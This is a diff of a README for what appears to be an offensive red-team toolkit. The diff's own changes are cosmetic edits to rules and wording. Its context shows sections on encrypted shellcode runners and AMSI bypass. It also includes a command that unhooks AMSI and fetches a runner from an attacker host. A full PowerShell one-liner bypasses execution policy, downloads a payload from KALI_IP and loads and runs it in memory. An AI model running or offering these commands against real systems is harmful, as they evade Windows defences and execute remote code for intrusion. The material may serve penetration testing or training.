@@ -96,7 +96,7 @@ drwxr-xr-x 9 kali kali  4096 Feb  2 08:20 ..
 
 ```
 
-
+---
 ## 1. Shellcode Runners
 
 ### 1.1 Triple DES
@@ -120,7 +120,6 @@ The executable ```des_decryptor_embeded.exe``` embedds the shellcode in base64, 
 cmd> des_decryptor_embedded.exe
 ```
 
-----
 
 ### 1.2 AMSI Bypass
 There are two methods to bypass AMSI:
@@ -154,7 +153,6 @@ To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github
 2. Copy your shellcode runner (```payloads/XOR/``` or ```payloads/Caesar/```) to your web server folder.
 3. ```unhook_amsi.exe http://<KALI>/shellcode_runner.exe```
 
----
 
 ### 1.3 Executing .XSL, .JS, .HTA
 
@@ -233,9 +231,9 @@ powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Softw
 ```
 powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data = $webclient.DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
 ```
-
+---
 ## 4. Output
-If everything goes well, you will get an output as bellow:
+If everything goes well, you will get an output as the following:
 
 ```
 ──(kali㉿kali)-[~/…/Apophis]
